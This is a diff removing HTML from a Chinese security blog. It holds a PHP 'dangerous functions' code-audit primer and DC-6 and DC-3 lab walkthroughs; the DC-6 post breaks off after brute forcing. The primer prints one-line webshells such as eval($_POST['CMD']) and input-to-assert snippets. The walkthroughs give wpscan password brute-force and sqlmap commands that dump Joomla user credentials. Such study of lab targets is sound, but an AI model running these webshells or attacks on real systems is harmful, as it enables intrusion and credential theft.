-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/02/php-wei-xian-han-shu-zong-jie/" itemprop="url">PHP危险函数总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T23:02:41+08:00">
-                2020-04-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">代码审计学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h4 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h4><p>​    函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
-<pre><code>$_GET            
-$POST
-$_fILES
-$_COOKIE
-$_REQUEST        
-$_SERVER        
-$_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
-<li>eval函数</li>
-<li>assert函数</li>
-<li>create_function 函数</li>
-<li>preg_replace 函数</li>
-<li>call_user_func/call_user_func_array函数</li>
-<li>array_map函数</li>
-<li>array_filter函数</li>
-<li>usort/uasort函数</li>
-<li>$a($b)动态函数</li>
-</ul>
-<h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
-<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
-<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
-<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
-<pre><code>&lt;?php
-$string = &quot;beautiful&quot;;
-$time = &quot;winter&quot;;
-$str = &#39;This is a $string $time morning!&#39;;
-eval(&quot;\$str = \&quot;$str\&quot;;&quot;);
-echo $str;
-
-输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
-<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
-<p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
-<p>版本只能为：5.x</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>
-    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p>如果我们提交?func=fo，即可写入shell.php</p>
-<h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>create_function(string $args, string $code)</p>
-<p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
-<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
-<pre><code>&lt;?php
-
-$id=$_GET[&#39;id&#39;];
-
-$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;
-
-$f1 = create_function(&#39;$a&#39;, $str2);
-
-$f1(&quot;abc&quot;);
-?&gt;</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
-<h5 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h5><p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
-<p>示例1：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p>当我们所要匹配的字符串中含有test时</p>
-<p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
-<p>示例2：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
-<h5 id="call-user-func-call-user-func-array函数"><a href="#call-user-func-call-user-func-array函数" class="headerlink" title="call_user_func/call_user_func_array函数"></a>call_user_func/call_user_func_array函数</h5><p>call_user_func($callback,$parameter)</p>
-<p>调用一个回调函数处理字符串,</p>
-<p>call_user_func_array($callback,$param arr)</p>
-<p>利用回调函数处理数组。</p>
-<p><strong>示例1：</strong></p>
-<img src=QQ截图20200218130741.png />
-
-<img src="QQ截图20200218130753.png" style="zoom:67%;" />
-
-<p><strong>示例2：</strong></p>
-<p>一句话木马：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
-<h5 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h5><p>array_map（$callback,$array1)</p>
-<p>​    作用是为数组的每个元素应用回调函数 。其返回值为数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
-
-<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
- <img src="QQ截图20200218133234.png"  />
-
-
-
-<h5 id="array-filter函数"><a href="#array-filter函数" class="headerlink" title="array_filter函数"></a>array_filter函数</h5><p>array_filter() 函数用回调函数过滤数组中的元素。</p>
-<p>该函数把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>
-<p>语法：array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-
-<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
-<img src="QQ截图20200218202542.png" style="zoom:67%;" />
-
-<h5 id="usort-uasort函数"><a href="#usort-uasort函数" class="headerlink" title="usort/uasort函数"></a>usort/uasort函数</h5><p><strong>usort</strong></p>
-<p>使用用户自定义的比较函数对数组中的值进行排序 </p>
-<p>usort(array, cmp_function)；</p>
-<p>uasort(array, cmp_function)；</p>
-<h5 id="a-b动态函数"><a href="#a-b动态函数" class="headerlink" title="$a$b动态函数"></a>$a$b动态函数</h5><h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
-<ul>
-<li><p><strong>Fopen()</strong></p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span>
-<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
-<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token punctuation">}</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-</li>
-</ul>
-<ul>
-<li><strong>file_get_content()</strong></li>
-</ul>
-<ul>
-<li><strong>curl</strong></li>
-</ul>
-<h4 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h4><h5 id="system函数"><a href="#system函数" class="headerlink" title="system函数"></a>system函数</h5><p>system():执行外部程序，并且返回输出</p>
-<h5 id="shell-exec-没有回显的命令执行"><a href="#shell-exec-没有回显的命令执行" class="headerlink" title="shell_exec(没有回显的命令执行)"></a>shell_exec(没有回显的命令执行)</h5><p>shell_exec():通过shell环境，并且将完整的输出以字符串方式返回</p>
-<h5 id="passthru函数"><a href="#passthru函数" class="headerlink" title="passthru函数"></a>passthru函数</h5><p>执行外部程序并且显示原始输出</p>
-<h5 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h5><p>​    exec():执行一个外部程序 </p>
-<h5 id="ob-start函数"><a href="#ob-start函数" class="headerlink" title="ob_start函数"></a>ob_start函数</h5><h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p>
-<ul>
-<li><strong>Copy()</strong></li>
-</ul>
-<p>copy() 函数拷贝文件</p>
-<p>语法：copy(source,destination)</p>
-<pre><code>&lt;?php
-echo copy(&quot;source.txt&quot;,&quot;target.txt&quot;);
-?&gt;</code></pre><p>输出1。</p>
-<ul>
-<li><p><strong>File_get_contents()/File_put_contents</strong></p>
-<ul>
-<li><p>file_get_contents() 把整个文件读入一个字符串中。</p>
-<p>语法：file_get_contents(path,include_path,context,start,max_length)</p>
-<pre><code>&lt;?php
-echo file_get_contents(&quot;test.txt&quot;);
-?&gt;</code></pre></li>
-<li><p>file_put_contents() 函数把一个字符串写入文件中。</p>
-<p>语法：int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</p>
-<pre><code>&lt;?php
-echo file_put_contents(&quot;sites.txt&quot;,&quot;Runoob&quot;);
-?&gt;</code></pre></li>
-</ul>
-</li>
-<li><p><strong>File()</strong></p>
-<ul>
-<li><p>file() 函数把整个文件读入一个数组中。</p>
-<p>数组中的每个元素都是文件中相应的一行，包括换行符在内</p>
-<p>语法：file(path,include_path,context)</p>
-<pre><code>&lt;?php
-print_r(file(&quot;test.txt&quot;));
-?&gt;</code></pre></li>
-</ul>
-</li>
-<li><p><strong>Fopen()</strong></p>
-<ul>
-<li><p>open() 函数打开一个文件或 URL。</p>
-<p>如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p>
-<p>语法：fopen(filename,mode,include_path,context)</p>
-<pre><code>&lt;?php
-$file = fopen(&quot;test.txt&quot;,&quot;r&quot;);
-$file = fopen(&quot;/home/test/test.txt&quot;,&quot;r&quot;);
-$file = fopen(&quot;/home/test/test.gif&quot;,&quot;wb&quot;);
-$file = fopen(&quot;http://www.example.com/&quot;,&quot;r&quot;);
-$file = fopen(&quot;ftp://user:password@example.com/test.txt&quot;,&quot;w&quot;);
-?&gt;</code></pre></li>
-</ul>
-</li>
-<li><p><strong>Move_uploaded_file()</strong></p>
-<ul>
-<li><p>move_uploaded_file() 函数把上传的文件移动到新位置。</p>
-<p>如果成功该函数返回 TRUE，如果失败则返回 FALSE。</p>
-<p>语法：move_uploaded_file(file,newloc)</p>
-</li>
-</ul>
-</li>
-<li><p><strong>Readfile()</strong></p>
-<ul>
-<li><p>readfile() 函数读取一个文件，并写入到输出缓冲。</p>
-<p>语法：readfile(filename,include_path,context)</p>
-<pre><code>&lt;?php
-echo readfile(&quot;test.txt&quot;);
-?&gt;</code></pre></li>
-</ul>
-</li>
-<li><p><strong>Rename()</strong></p>
-<ul>
-<li><p>rename() 函数重命名文件或目录。</p>
-<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
-<p>语法：rename(oldname,newname,context)</p>
-<pre><code>&lt;?php
-rename(&quot;images&quot;,&quot;pictures&quot;);
-?&gt;</code></pre></li>
-</ul>
-</li>
-<li><p><strong>Unlink()</strong></p>
-<ul>
-<li><p>unlink() 函数删除文件。</p>
-<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
-<p>语法：unlink(filename,context)</p>
-<pre><code>&lt;?php
-$file = &quot;test.txt&quot;;
-if (!unlink($file))
-{
-echo (&quot;Error deleting $file&quot;);
-}
-else
-{
-echo (&quot;Deleted $file&quot;);
-}
-?&gt;</code></pre></li>
-</ul>
-</li>
-</ul>
-<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://wh0ale.github.io/2019/08/21/php代码审计危险函数总结/" target="_blank" rel="noopener">https://wh0ale.github.io/2019/08/21/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/</a></p>
-<p><a href="https://blog.csdn.net/qq_43431158/article/details/99673451" target="_blank" rel="noopener">https://blog.csdn.net/qq_43431158/article/details/99673451</a></p>
-<p><a href="https://blog.csdn.net/zhezhebie/article/details/80508139" target="_blank" rel="noopener">https://blog.csdn.net/zhezhebie/article/details/80508139</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/31/dc-6-ba-ji/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/31/dc-6-ba-ji/" itemprop="url">DC-6靶机</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-31T22:20:37+08:00">
-                2020-03-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="DC-6靶机学习"><a href="#DC-6靶机学习" class="headerlink" title="DC-6靶机学习"></a>DC-6靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>我们设置靶机与kali均为.nat模式连接。</p>
-<p>然后我们首先考虑获得靶机的IP地址。使用arp去发现内网存活主机，从而确定靶机IP为192.168.153.137。</p>
-<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200455.png" alt=""></p>
-<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用神器nmap对靶机IP进行探测。</p>
-<pre><code>nmap -A -p 1-65535 192.168.153.137 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209200850.png" alt=""></p>
-<p>我们发现靶机开放了22端口和80端口。</p>
-<p>我们直接访问IP发现被重定向到了<a href="http://wordy。" target="_blank" rel="noopener">http://wordy。</a></p>
-<p>我们编辑 /etc/hosts中的文件添加该域名</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200211113951.png" alt=""></p>
-<p>我们再次尝试访问192.168.153.137发现成功跳转，</p>
-<p>我们利用火狐自带插件进行指纹识别</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200209201216.png" alt=""></p>
-<p>我们可以确定该cms为WordPress，且数据库为MYSQL</p>
-<h4 id="第三步、漏洞扫描"><a href="#第三步、漏洞扫描" class="headerlink" title="第三步、漏洞扫描"></a>第三步、漏洞扫描</h4><p>使用wordpress漏洞测试工具wpscan进行网站漏洞探测，wpscan是一款针对wordpress的黑盒漏洞扫描器，可以获得包括版本、主体、插件等信息。</p>
-<pre><code>wpscan --url http://Wordy -u t</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209201612.png" alt=""></p>
-<p>通过扫描我们得到几个系统的用户名信息。我们接下来思考能否获得任一账号的密码。</p>
-<h4 id="第四步、漏洞利用"><a href="#第四步、漏洞利用" class="headerlink" title="第四步、漏洞利用"></a>第四步、漏洞利用</h4><p>我们首先根据作者的提示，使用到kali里面的rockyou.txt字典</p>
-<p>使用解压命令：</p>
-<pre><code>gzip -d rockyou.txt.gz</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209202612.png" alt=""></p>
-<pre><code>cat rockyou.txt | grep k01&gt;k01.txt</code></pre><p>将里面的k01的部分导出到dc6目录下面的passwords.txt</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200209202622.png" alt=""></p>
-<p>接着使用wpscan的暴力破解命令：</p>
-<pre><code>wpscan --url wordy -u -p passwords.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200209203905.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204033.png" alt=""></p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200209204455.png" alt=""></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/dc-3-ba-ji/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/header.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/12/dc-3-ba-ji/" itemprop="url">DC-3靶机</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T23:07:00+08:00">
-                2020-03-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
-                    <span itemprop="name">靶机学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
-<p>使用nmap进行二层主机发现</p>
-<pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p>
-<h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
-<pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p>
-<p>发现80端口开放且运行Apache服务。</p>
-<p>我们网页访问IP的80端口</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p>
-<p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
-<h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
-<pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
-<pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p>
-<p>我们得到了该Joomla的具体版本号为3.7.0.</p>
-<h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p>
-<p>发现存在一个sql注入漏洞。</p>
-<p>我们将该漏洞文档复制到根目录下，然后打开。</p>
-<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txt
-cat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p>
-<p>文档中给出了sqlmap自动注入的payload.</p>
-<h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
-<ul>
-<li>查询所有数据库：</li>
-</ul>
-<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p>
-<p>查询当前使用数据库：</p>
-<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]
-</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p>
-<p>查询joomladb数据库下的表：</p>
-<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p>
-<p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
-<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p>
-<p>最后我们输出name,password的信息：</p>
-<pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p>
